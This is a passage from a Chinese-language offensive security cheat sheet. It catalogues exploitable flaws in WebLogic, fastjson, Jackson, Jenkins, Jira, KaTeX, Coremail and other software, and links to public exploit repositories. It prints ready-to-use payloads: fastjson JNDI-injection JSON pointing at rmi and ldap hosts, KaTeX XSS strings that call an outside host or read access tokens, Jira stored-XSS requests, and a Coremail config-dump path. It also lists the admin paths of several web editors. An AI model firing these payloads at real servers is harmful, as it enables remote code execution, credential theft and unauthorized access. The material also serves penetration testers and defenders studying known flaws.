    - [jas502n/CVE-2019-2890](https://github.com/jas502n/CVE-2019-2890)

**CVE-2020-2551 Weblogic RCE with IIOP**
- 简介

    最近 Oracle 发布了新一轮补丁,其中重点了修复多个高危安全漏洞.其中较为严重之一的则是 CVE-2020-2551.攻击者可以在未授权的情况下通过 IIOP 协议对存在漏洞的 WebLogic 进行远程代码执行的攻击.成功利用该漏洞的攻击者可以直接控制服务器,危害性极高。

- 影响版本
    - weblogic_server 10.3.6.0.0
    - weblogic_server 12.1.3.0.0
    - weblogic_server 12.2.1.3.0
    - weblogic_server 12.2.1.4.0

- 文章
    - [WebLogic CVE-2020-2551漏洞分析](https://paper.seebug.org/1138/)
    - [漫谈WebLogic CVE-2020-2551](https://www.anquanke.com/post/id/201005)

- POC | Payload | exp
    - [jas502n/CVE-2020-2551](https://github.com/jas502n/CVE-2020-2551)
    - [Y4er/CVE-2020-2551](https://github.com/Y4er/CVE-2020-2551)

**CVE-2020-2555 Oracle Coherence 反序列化漏洞分析**
- 简介

    Oracle 官方在1月补丁中修复了 CVE-2020-2555 漏洞，该漏洞位于 Oracle Coherence 组件中。该组件是业内领先的用于解决集群应用程序数据的缓存的解决方案，其默认集成在 Weblogic12c 及以上版本中。

    该漏洞提出了一条新的反序列化 gadget，未经身份验证的攻击者通过精心构造的 T3 请求触发可以反序列化 gadget，最终造成远程命令执行的效果。

- 文章
    - [Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）](https://paper.seebug.org/1141/)

- POC | Payload | exp
    - [Y4er/CVE-2020-2555](https://github.com/Y4er/CVE-2020-2555)

---

## Websphere

**CVE-2014-0910**
- POC | Payload | exp
    - [IBM Websphere Portal - Persistent Cross-Site Scripting](https://www.exploit-db.com/exploits/36941)

**CVE-2015-7450**
- POC | Payload | exp
    - [websphere_rce.py](https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py)

**CVE-2019-4279**
- 文章
    - [Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) ](https://xz.aliyun.com/t/6394)

---

# 组件
## 编辑器

**手册**
- [编辑器漏洞手册](https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/)

### ewebeditor

> 官网 : http://www.ewebeditor.net/

**文章**
- [ewebeditor 编辑器漏洞总结](https://www.0dayhack.com/post-426.html)

**常用路径**
```
Admin_Login.asp
Admin_Default.asp
Admin_Style.asp
Admin_UploadFile.asp
Upload.asp
Admin_ModiPwd.asp
eWebEditor.asp
db/ewebeditor.mdb
ewebeditor/login_admin.asp
eweb/login_admin.asp
editor/login_admin.asp
```

---

### FCKeditor

> 官网 : https://ckeditor.com/

**文章**
- [Fckeditor上传漏洞利用拿shell总结](https://www.0dayhack.com/post-413.html)

**常用路径**
```
FCKeditor/_samples/default.html
FCKeditor/_whatsnew.html
fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.test.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php
FCKeditor/_samples/asp/sample01.asp
FCKeditor/_samples/asp/sample02.asp
FCKeditor/_samples/asp/sample03.asp
FCKeditor/_samples/asp/sample04.asp
```

---

### kindeditor

> 官网 : http://kindeditor.net/

**kindeditor<=4.1.5 上传漏洞**
- 文章
    - [kindeditor<=4.1.5上传漏洞复现](https://www.cnblogs.com/backlion/p/10421405.html)

- 漏洞修复
    1. 直接删除 `upload_json.*` 和 `file_manager_json.*`
    2. 升级 kindeditor 到最新版本

---

### ueditor

**CNVD-2017-20077 ueditor 上传漏洞**
- 文章
    - [UEditor编辑器两个版本任意文件上传漏洞分析](https://www.freebuf.com/vuls/181814.html)

- POC | Payload | exp
    - [theLSA/ueditor-getshell](https://github.com/theLSA/ueditor-getshell)

---

## 序列化

**文章**
- [无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件](https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/)

### fastjson

> 项目地址 : https://github.com/alibaba/fastjson

**文章**
- [Fastjson反序列化进攻利用](https://mp.weixin.qq.com/s/i7-g89BJHIYTwaJbLuGZcQ)

**工具**
- [wyzxxz/fastjson_rce_tool](https://github.com/wyzxxz/fastjson_rce_tool) - fastjson rce 命令执行综合利用工具，一键操作,fastjson remote code execute poc
- [c0ny1/FastjsonExploit](https://github.com/c0ny1/FastjsonExploit) - fastjson漏洞快速利用框架
- [Lonely-night/fastjson_gadgets_scanner](https://github.com/Lonely-night/fastjson_gadgets_scanner) - scanner 扫描反编译生成的源文件
- [p1g3/Fastjson-Scanner](https://github.com/p1g3/Fastjson-Scanner) - a burp extension to find where use fastjson

---

以下内容来自 <sup>[Tide安全团队 [Fastjson反序列化进攻利用](https://mp.weixin.qq.com/s/i7-g89BJHIYTwaJbLuGZcQ) 文章]</sup>

**fastjson<=1.2.24 反序列化漏洞**
- POC | Payload | exp
    ```json
    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
    ```

**fastjson<=1.2.41**
- 简介

    第一个 Fastjson 反序列化漏洞爆出后，阿里在1.2.25版本设置了 autoTypeSupport 属性默认为 false，并且增加了checkAutoType() 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。 com.sun.rowset.JdbcRowSetImpl 在1.2.25版本被加入了黑名单，fastjson 有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此在原类名头部加L，尾部加;即可绕过黑名单的同时加载类。

    autoTypeSupport 属性为 true 才能使用。（fastjson>=1.2.25 默认为 false）

- POC | Payload | exp
    ```json
    {"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
    ```

**fastjson<=1.2.42**
- 简介

    fastjson 在1.2.42版本新增了校验机制。

    如果输入类名的开头和结尾是L和;就将头和尾去掉，再进行黑名单验证。 还把黑名单的内容进行了加密，防止安全人员进行研究，增加了研究的门槛。 但是有人已在Github上跑出了大部分黑名单包类：https://github.com/LeadroyaL/fastjson-blacklist绕过方法，在类名外部嵌套2层L;。 原类名：com.sun.rowset.JdbcRowSetImpl 绕过： LLcom.sun.rowset.JdbcRowSetImpl;;

- POC | Payload | exp
    ```json
    {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
    ```

**fastjson<=1.2.43**
- 简介

    fastjson 在1.2.43中checkAutoType()函数增加判断开头为LL直接报错。 绕过方法:根据fastjson判断函数，[开头则提取类名，且后面字符字符为"["、"{"等，即可正常调用。

    autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

- POC | Payload | exp
    ```json
    {"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
    ```

**fastjson<=1.2.45**
- 简介

    前提条件：需要目标服务端存在 mybatis 的 jar 包，且版本需为 3.x.x 系列 <3.5.0 的版本。 使用黑名单绕过，org.apache.ibatis.datasource 在1.2.46版本被加入了黑名单 由于在项目中使用的频率也较高，所以影响范围较大。

- POC | Payload | exp
    ```json
    {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}}
    ```

**fastjson <=1.2.47 远程代码执行漏洞**
- 简介

    autoType 为关闭状态也可使用。 loadClass 中默认 cache 设置为 true，利用分为2步执行，首先使用 java.lang.Class 把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了 com.sun.rowset.JdbcRowSetImpl 这个类，绕过了黑名单机制。

- 文章
    - [Fastjson <=1.2.47 远程代码执行漏洞分析](https://www.anquanke.com/post/id/181874)

- 工具
    - [CaijiOrz/fastjson-1.2.47-RCE](https://github.com/CaijiOrz/fastjson-1.2.47-RCE)

**fastjson<=1.2.62**
- POC | Payload | exp
    ```json
    {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
    ```

**fastjson < 1.2.66 远程代码执行漏洞**
- POC | Payload | exp
    ```json
    {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

    {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

    {"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}

    {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1389/Calc"}}
    ```

**fastjson < 1.2.66 版本拒绝服务漏洞**

- 影响范围
    - 1.2.36 - 1.2.62

- 文章
    - [fastjson < 1.2.66 版本最新漏洞分析](https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q)

### Jackson

FasterXML Jackson 是美国 FasterXML 公司的一款适用于 Java 的数据处理工具。

主要的几个 jar 包：
- jackson-core : 核心包
- jackson-annotations : 注解包
- jackson-databind : 数据绑定包

**CVE-2017-7525 Jackson-databind 反序列化漏洞**
- 简介

    Jackson-databind 支持 Polymorphic Deserialization 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 TemplatesImpl，可以实现任意代码执行。

- 文章
    - [Jackson-databind 反序列化漏洞（CVE-2017-7525）](https://vulhub.org/#/environments/jackson/CVE-2017-7525/)

**CVE-2017-17485 Jackson-databind 反序列化**
- 简介

    FasterXML Jackson 是美国 FasterXML 公司的一款适用于 Java 的数据处理工具。jackson-databind 是其中的一个具有数据绑定功能的组件。

    FasterXML Jackson-databind 2.8.10 及之前版本和 2.9.x 版本至 2.9.3 版本中存在代码问题漏洞。远程攻击者可通过向 ObjectMapper 的 readValue 方法发送恶意制作的 JSON 输入并绕过黑名单利用该漏洞执行代码。

- 文章
    - [CVE-2017-17485 Jackson-databind 反序列化](http://www.sec-redclub.com/archives/1058/)

**CVE-2019-12086**
- 简介

    使用了 jackson-databind 2.x before 2.9.9 的 Java 应用，如果 ClassPath 中有 com.mysql.cj.jdbc.admin.MiniAdmin（存在于 MySQL 的 JDBC 驱动中）这个类，那么 Java 应用所在的服务器上的文件，就可能被任意读取并传送到恶意的MySQL Server。

- 文章
    - [分析Jackson的安全漏洞CVE-2019-12086](https://www.cnblogs.com/xinzhao/p/11005419.html)

**CVE-2019-12384 Jackson-databind RCE And SSRF**
- 简介

    6月21日，Redhat 官方发布 jackson-databind 漏洞（CVE-2019-12384）安全通告，多个 Redhat 产品受此漏洞影响，CVSS 评分为 8.1，漏洞利用复杂度高。7月22日，安全研究员 Andrea Brancaleoni 对此漏洞进行分析，并公布了该漏洞的分析文章。

    该漏洞是由于 Jackson 黑名单过滤不完整而导致，当开发人员在应用程序中通过 ObjectMapper 对象调用 enableDefaultTyping 方法时，程序就会受到此漏洞的影响，攻击者就可利用构造的包含有恶意代码的 json 数据包对应用进行攻击，直接获取服务器控制权限。

- 影响版本
    - Jackson-databind 2.X < 2.9.9.1

- 文章
    - [CVE-2019-12384：Jackson反序列化漏洞分析](https://www.anquanke.com/post/id/182695)
    - [Jackson CVE-2019-12384 RCE 复现记录 ](http://scriptboy.cn/p/jackson-cve-2019-12384/)

- POC | Payload | exp
    - [jas502n/CVE-2019-12384](https://github.com/jas502n/CVE-2019-12384)

**CVE-2020-8840 FasterXML/jackson-databind 远程代码执行漏洞**
- 影响版本
    - Jackson-databind 2.X < 2.9.10.2

- POC | Payload | exp
    - [jas502n/CVE-2020-8840](https://github.com/jas502n/CVE-2020-8840)

**CVE-2020-9547 FasterXML/jackson-databind 远程代码执行漏洞**
- 影响版本
    - Jackson-databind 2.X < 2.9.10.4

- POC | Payload | exp
    - [fairyming/CVE-2020-9547](https://github.com/fairyming/CVE-2020-9547)

**CVE-2020-9548 FasterXML/jackson-databind 远程代码执行漏洞**
- 影响版本
    - Jackson-databind 2.X < 2.9.10.4

- POC | Payload | exp
    - [fairyming/CVE-2020-9548](https://github.com/fairyming/CVE-2020-9548)

**CVE-2020-11113 远程代码执行漏洞**
- 影响版本
    - Jackson-databind  < 2.9.10.4

- 文章
    - [Jackson-databind-2670远程代码执行漏洞简单分析](https://xz.aliyun.com/t/7506)

### Xstream

**文章**
- [XStream反序列化组件攻击分析](https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x00-XStream%E7%BB%84%E4%BB%B6%E5%8A%9F%E8%83%BD)

---

## JavaScript库
### jQuery

**检测工具**
- [jQuery versions with known weaknesses](http://research.insecurelabs.org/jquery/test/) - 在线查找已知版本的 jQuery 漏洞
- [mahp/jQuery-with-XSS](https://github.com/mahp/jQuery-with-XSS)
    ```
    将代码中 src 后的链接修改为自己要验证的 js 地址链接。
    ```

### KaTeX

**xss**
- 相关链接
    - [[CRITICAL BUG] Inject any html/css/js by using KaTeX · Issue #1160 · KaTeX/KaTeX](https://github.com/KaTeX/KaTeX/issues/1160)
    - [[BUG] Injecting arbitrary code into webapp by exploiting KaTeX (#1859) · Issues · GitLab.org / gitter / webapp · GitLab](https://gitlab.com/gitlab-org/gitter/webapp/-/issues/1859)
    - [Gitter XSS Crypto Mining Security Issue Notification](https://blog.gitter.im/2018/02/16/gitter-xss-cryptocoin-mining-security-issue-notification/)

- 案例
    - [Sec-IN社区安全测试——文章正文XSS](https://www.sec-in.com/article/261)

- POC | Payload | exp
    ```
    $$ \<script id="iplog">x=new XMLHttpRequest(); x.open("GET",
    "https://afternoon-fjord-12487.herokuapp.com/");
    x.send();document.getElementById("id").parent.parent.style = "display:none"
    </script> $$
    ```
    ```
    $$ \<input type=image src=/static/css/img/logo.23d7be3.svg
    onload=alert(localStorage.access_token)> $$
    ```

---

## 其他
### Ghostscript

**CVE-2019-6116 沙箱绕过（命令执行）漏洞**
- POC | Payload | exp
    - [GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）](https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116)

### webuploader

> 项目地址 : https://github.com/fex-team/webuploader

**webuploader-v-0.1.15 组件存在文件上传漏洞(未授权)**
- POC | Payload | exp
    - [jas502n/webuploader-0.1.15-Demo](https://github.com/jas502n/webuploader-0.1.15-Demo#webuploader-v-0115-%E7%BB%84%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%9C%AA%E6%8E%88%E6%9D%83)

---

# 服务
## Aria2

> 项目地址 : https://github.com/aria2/aria2

**Aria2 任意文件写入漏洞**
- 简介

    Aria2 是一个命令行下轻量级、多协议、多来源的下载工具 (支持 HTTP/HTTPS、FTP、BitTorrent、Metalink) ,内建 XML-RPC 和 JSON-RPC 接口.在有权限的情况下,我们可以使用 RPC 接口来操作 aria2 来下载文件,将文件下载至任意目录,造成一个任意文件写入漏洞.

- 文章
    - [Aria2 任意文件写入漏洞](https://github.com/vulhub/vulhub/blob/master/aria2/rce/README.zh-cn.md)

---

## Cacti

**CVE-2020-8813 Cacti v1.2.8 远程命令执行漏洞**
- 文章
    - [Cacti v1.2.8 authenticated Remote Code Execution (CVE-2020-8813)](https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/)

---

## Confluence

> 官网 : https://www.atlassian.com/software/confluence

Confluence 是一个专业的企业知识管理与协同软件，也可以用于构建企业 wiki。使用简单，强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。

**CVE-2019-3394 Confluence 文件读取漏洞**
- 文章
    - [Confluence 文件读取漏洞(CVE-2019-3394)分析](https://paper.seebug.org/1025/)

**CVE-2019-3396 Confluence Wiki 远程代码执行**
- 文章
    - [Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析](https://paper.seebug.org/884/)

- POC | Payload | exp
    - [jas502n/CVE-2019-3396](https://github.com/jas502n/CVE-2019-3396)

**CVE-2019-3398 Atlassian Confluence Download Attachments Remote Code Execution**
- 简介

    Confluence Server 和 Data Center 在 downloadallattachments 资源中存在路径穿越漏洞。 在 Page 或 Blogs 具有添加附件权限的用户，或具有创建新空间或个人空间权限的用户，或对某空间具有“管理员”权限的用户可利用此路径穿越漏洞将文件写入任意位置。一定条件下可以执行任意代码。

- 影响版本
    - Atlassian confluence 2.0.0 ~ 6.6.13
    - Atlassian confluence 6.7.0 ~ 6.12.4
    - Atlassian confluence 6.13.0 ~ 6.13.4
    - Atlassian confluence 6.14.0 ~ 6.14.3

- POC | Payload | exp
    - https://www.peerlyst.com/posts/cve-2019-3398-atlassian-confluence-download-attachments-remote-code-execution-juniper-networks?utm_source=twitter&utm_medium=social&utm_content=peerlyst_post&utm_campaign=peerlyst_shared_post

---

## Coremail

> 官网 : https://www.coremail.cn/

Coremail 论客邮件系统于2000年首发，是中国第一套中文邮件系统。是网易等运营商至今一直使用的邮件系统，也是政府机关、大学、金融机构、上市公司及其他大型企业（包含国有企业）广泛使用的邮件系统。

**工具**
- [dpu/coremail-address-book](https://github.com/dpu/coremail-address-book) - Coremail邮件系统组织通讯录一键导出

**敏感文件泄露漏洞**
- POC | Payload | exp
    ```
    /mailsms/s?func=ADMIN:appState&dumpConfig=/
    ```
    - [yuxiaoyou123/coremail-exp](https://github.com/yuxiaoyou123/coremail-exp)

---

## Crowd

> 官网 : https://www.atlassian.com/software/crowd

Atlassian Crowd 是一套基于 Web 的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center 是 Crowd 的集群部署版。

**CVE-2019-11580 Atlassian Crowd 未授权访问漏洞**
- 简介

    Atlassian Crowd 和 Crowd Data Center 在其某些发行版本中错误地启用了 pdkinstall 开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对 Atlassian Crowd 和 Crowd Data Center 安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。

- 影响版本
    - Atlassian Crowd 2.1.0 ~ 3.0.5
    - Atlassian Crowd 3.1.0 ~ 3.1.6
    - Atlassian Crowd 3.2.0 ~ 3.2.8
    - Atlassian Crowd 3.3.0 ~ 3.3.5
    - Atlassian Crowd 3.4.0 ~ 3.4.4

- 文章
    - [Analysis of an Atlassian Crowd RCE - CVE-2019-11580](https://www.corben.io/atlassian-crowd-rce/)

- POC | Payload | exp
    - [jas502n/CVE-2019-11580](https://github.com/jas502n/CVE-2019-11580)

---

## FlySpray

> 官网 : http://www.flyspray.org/

**XSRF Stored FlySpray 1.0-rc4 (XSS2CSRF add admin account)**
- POC | Payload | exp
    - [FlySpray 1.0-rc4 - Cross-Site Scripting / Cross-Site Request Forgery](https://www.exploit-db.com/exploits/41918)

---

## Harbor

> 官网 : https://goharbor.io/

Harbor 的漏洞参考 https://github.com/goharbor/harbor/security/advisories

**CVE-2019-3990 User Enumeration Vulnerability**
- https://github.com/goharbor/harbor/security/advisories/GHSA-6qj9-33j4-rvhg

- 影响版本
    - harbor 1.7.0 ~ 1.7.6
    - harbor 1.8.0 ~ 1.8.5
    - harbor 1.9.0 ~ 1.9.1

- POC | Payload | exp
    ```
    GET /api/users/search?email=@test
    .com
        => {"code":400,"message":"username is required"}

    GET /api/users/search?username=t
        => User Enumeration
    ```

---

## Jenkins

> 官网 : https://jenkins.io/

Jenkins 的漏洞参考 https://jenkins.io/security/advisories/

**搭建教程**
- [Jenkins 搭建](../../../../运维/Linux/Power-Linux.md#Jenkins)

**文章**
- [Hacking Jenkins Part 1 - Play with Dynamic Routing](https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/)
- [Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/)
- [Jenkins RCE漏洞分析汇总](http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/)

**资源**
- [gquere/pwn_jenkins: Notes about attacking Jenkins servers](https://github.com/gquere/pwn_jenkins)
- [petercunha/jenkins-rce](https://github.com/petercunha/jenkins-rce)

**工具**
- [blackye/Jenkins](https://github.com/blackye/Jenkins) - Jenkins漏洞探测、用户抓取爆破

**未授权访问漏洞**
- 简介

    默认情况下 Jenkins 面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。

- 文章
    - [知其一不知其二之Jenkins Hacking](https://www.secpulse.com/archives/2166.html)

- 利用

    `http://<IP>:8080/manage`

**CVE-2017-1000353 未授权远程代码执行漏洞**
- 简介

    Jenkins 未授权远程代码执行漏洞, 允许攻击者将序列化的 Java SignedObject 对象传输给 Jenkins CLI 处理，反序列化 ObjectInputStream 作为 Command 对象，这将绕过基于黑名单的保护机制, 导致代码执行。

- 影响版本
    - jenkins < 2.56

- POC | Payload | exp
    - [vulhub/CVE-2017-1000353](https://github.com/vulhub/CVE-2017-1000353)

**CVE-2018-1000861 远程命令执行漏洞**
- 简介

    Jenkins 使用 Stapler 框架开发,其允许用户通过 URL PATH 来调用一次 public 方法.由于这个过程没有做限制,攻击者可以构造一些特殊的 PATH 来执行一些敏感的 Java 方法.

    通过这个漏洞,我们可以找到很多可供利用的利用链.其中最严重的就是绕过 Groovy 沙盒导致未授权用户可执行任意命令:Jenkins 在沙盒中执行 Groovy 前会先检查脚本是否有错误,检查操作是没有沙盒的,攻击者可以通过 Meta-Programming 的方式,在检查这个步骤时执行任意命令.

- 影响版本
    - jenkins < 2.153

- POC | Payload | exp
    - [orangetw/awesome-jenkins-rce-2019](https://github.com/orangetw/awesome-jenkins-rce-2019)

**CVE-2018-1999001 配置文件路径改动导致管理员权限开放漏洞**
- 简介

    Jenkins 官方在 7 月 18 号发布了安全公告，对 Jenkins 的两个高危漏洞进行通告，其中包括配置文件路径改动导致管理员权限开放的漏洞 CVE-2018-1999001，未授权用户通过发送一个精心构造的登陆凭据，能够致使匿名用户获取 Jenkins 的管理权限。

- 影响版本
    - jenkins < 2.121.1
    - jenkins 2.122 ~ 2.132

- 文章
    - [Jenkins配置文件路径改动导致管理员权限开放漏洞(CVE-2018-1999001) ](https://mp.weixin.qq.com/s/O_Ni4Xlsi4uHRcyv3SeY5g)

**CVE-2018-1999002 任意文件读取漏洞**
- 简介

    Jenkins 7 月 18 日的安全通告修复了多个漏洞，其中 SECURITY-914 是未授权任意文件读取漏洞。攻击者可以发送精心制作的 HTTP 请求，以返回 Jenkins 主文件中任何文件的内容，该漏洞存在于 Stapler Web 框架的 org/kohsuke/stapler/Stapler.java 中。

- 影响版本
    - jenkins < 2.121.1
    - jenkins 2.122 ~ 2.132

- 文章
    - [安全研究 | Jenkins 任意文件读取漏洞分析](https://bbs.ichunqiu.com/thread-43283-1-1.html)

**CVE-2019-1003000 未授权访问 RCE 漏洞**
- 简介

    脚本安全插件 1.49 和更早版本的 src/main/Java/org/jenkinsci/plugins/Script Security/sandbox/groovy/GroovysandBox.Java 中存在沙箱绕过漏洞，使得攻击者能够提供沙箱脚本在 Jenkins 主 JVM 上执行任意代码。

- 影响版本
    - jenkins < 1.49

- 文章
    - [Jenkins未授权访问RCE漏洞复现记录 | angelwhu_blog](https://www.angelwhu.com/blog/?p=539)
    - [Jenkins RCE CVE-2019-1003000 漏洞复现](https://blog.51cto.com/13770310/2352740)

- POC | Payload | exp
    - [adamyordan/cve-2019-1003000-jenkins-rce-poc: Jenkins RCE Proof-of-Concept: SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc)

**CVE-2019-10320 CloudBees Jenkins Credentials Plugin 信息泄露漏洞**
- 简介

    CloudBees Jenkins（Hudson Labs）是美国CloudBees公司的一套基于Java开发的持续集成工具。该产品主要用于监控持续的软件版本发布/测试项目和一些定时执行的任务。Credentials Plugin 是使用在其中的一个身份凭据存储插件。 Jenkins Credentials Plugin 2.1.18 及之前版本中存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。

- 影响版本
    - jenkins < 2.1.18

- 文章
    - [Exploring the File System via Jenkins Credentials Plugin Vulnerability – CVE-2019-10320 | Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/2019/05/23/exploring-the-file-system-via-jenkins-credentials-plugin-vulnerability-cve-2019-10320/)

---

## Jira

> 官网 : https://www.atlassian.com/software/jira

JIRA 是 Atlassian 公司出品的项目与事务跟踪工具，被广泛应用于缺陷跟踪、客户服务、需求收集、流程审批、任务跟踪、项目跟踪和敏捷管理等工作领域。

jira 的漏洞参考 https://jira.atlassian.com/browse/JRASERVER-69858?filter=13085

**CVE-2019-3403 信息泄露(用户名枚举)**
- 简介

    Atlassian Jira 7.13.3 之前版本、8.0.4 之前版本和 8.1.1 之前版本中存在用户名枚举漏洞，攻击者可利用该漏洞枚举用户名称。

- 影响版本
    - Atlassian Jira < 7.13.3
    - Atlassian Jira 8.0.0 ~ 8.0.4
    - Atlassian Jira 8.1.0 ~ 8.1.1

- POC | Payload | exp
    - https://blog.csdn.net/caiqiiqi/article/details/100094987

**CVE-2019-8442 Jira 未授权敏感信息泄露**
- 简介

    Atlassian Jira 是澳大利亚 Atlassian 公司的一套缺陷跟踪管理系统.该系统主要用于对工作中各类问题、缺陷进行跟踪管理. Atlassian Jira 7.13.4 之前版本、8.0.4 之前版本和 8.1.1 之前版本中的CachingResourceDownloadRewriteRule 类存在安全漏洞.远程攻击者可利用该漏洞访问 Jira webroot 中的文件.

- 影响版本
    - Atlassian Jira < 7.13.3
    - Atlassian Jira 8.0.0 ~ 8.0.4
    - Atlassian Jira 8.1.0 ~ 8.1.1

- POC | Payload | exp
    - https://note.youdao.com/ynoteshare1/index.html?id=4189e6fb21fb097a4109ac22f33b16cb&type=note
    - https://hackerone.com/reports/632808

    `/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml`

**CVE-2019-8444 存储型 XSS**
- 简介

    Atlassian Jira 7.13.6之前版本和8.3.2之前的8.x版本中的 wikirenderer 组件存在跨站脚本漏洞。该漏洞源于 WEB 应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。

- 影响版本
    - Atlassian Jira 7.7 ~ 7.13.6
    - Atlassian Jira 8.0.0 ~ 8.3.2

- POC | Payload | exp
    ```
    POST /rest/api/2/issue/TEST-7/comment HTTP/1.1
    Content-Type: application/json

    {"body":"!image.png|width=\\\" οnmοuseοver=alert(333);//!"}
    ```
    ```
    POST /rest/api/2/issue/TEST-7/comment HTTP/1.1
    Content-Type: application/json

    {"body":"!image.png|width=http://οnmοuseοver=alert(42&#x29;;//!"}
    ```

**CVE-2019-8446 信息泄露(用户名枚举)**
- 简介

    Atlassian Jira 8.3.2之前版本中的 /rest/issueNav/1/issueTable 资源存在授权问题漏洞。该漏洞源于网络系统或产品中缺少身份验证措施或身份验证强度不足。

- 影响版本
    - Atlassian Jira 7.6 ~ 8.3.2

- POC | Payload | exp
    - https://talosintelligence.com/vulnerability_reports/TALOS-2019-0839

**CVE-2019-8451 Jira 未授权 SSRF 漏洞**
- 简介

    Atlassian Jira 8.4.0 之前版本中的 /plugins/servlet/gadgets/makeRequest 资源存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。

- 影响版本

    - Atlassian Jira 7.6.0 ~ 8.4.0

- POC | Payload | exp
    - [jas502n/CVE-2019-8451](https://github.com/jas502n/CVE-2019-8451)

**CVE-2019-11581 Atlassian Jira 模板注入漏洞**
- 简介

    Atlassian Jira 多个版本前存在利用模板注入执行任意命令

- 影响版本
    - Atlassian Jira 4.4 ~ 7.6.14
    - Atlassian Jira 7.7.0 ~ 7.13.5
    - Atlassian Jira 8.0.0 ~ 8.0.3
    - Atlassian Jira 8.1.0 ~ 8.1.2
    - Atlassian Jira 8.2.0 ~ 8.2.3

- 文章
    - [Atlassian Jira 模板注入漏洞 (CVE-2019-11581) ](https://vulhub.org/#/environments/jira/CVE-2019-11581/)

---

## Jupyter

> 官网 : https://jupyter.org/

Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。

**未授权访问漏洞**
- 简介

    如果管理员未为 Jupyter Notebook 配置密码，将导致未授权访问漏洞，游客可在其中创建一个 console 并执行任意 Python 代码和命令。

- 示例

    `http://<IP>:8888`

---

## Nexus

> 官网 : https://www.sonatype.com/product-nexus-repository

**CVE-2019-7238 Nexus Repository Manager 3 Remote Code Execution without authentication < 3.15.0**
- 简介

